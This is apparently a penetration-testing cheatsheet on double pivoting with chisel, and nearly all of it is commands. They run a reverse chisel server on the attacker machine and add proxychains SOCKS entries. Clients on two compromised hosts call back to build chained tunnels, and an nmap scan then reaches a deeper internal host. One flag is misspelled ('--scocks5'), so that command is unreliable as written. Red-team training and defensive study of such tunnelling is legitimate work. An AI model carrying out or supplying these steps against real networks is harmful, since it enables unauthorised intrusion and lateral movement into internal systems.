---
title: chisel-double-pivoting
tags: [tunneling-and-exfiltration, pivoting, type/cheatsheet, phase/lateral-movement, platform/network]
---

# Chisel - Double Pivoting

          (19) 

## Attacker Machine

```
./chisel server -p 3333 --reverse


# Edit proxychains4.conf
sudo nano /etc/proxychains4.conf

Add -> socks5 127.0.0.1 1111
Add -> socks5 127.0.0.1 5555
```

## Second Machine (M 1)

```
./chisel32 server -p 2222 --reverse --scocks5 


# After completing steps on all the machines
./chisel32 client <server ip>:3333 Rsocks
```

## Third Machine (M 2)

```
./chisel32 client <second machine ip>:2222 Rsocks
```

## Scan Fourth Machine (M 3)

```
proxychains nmap -sT -p 22 <m3 machine ip>
```

##

## REFERENCES



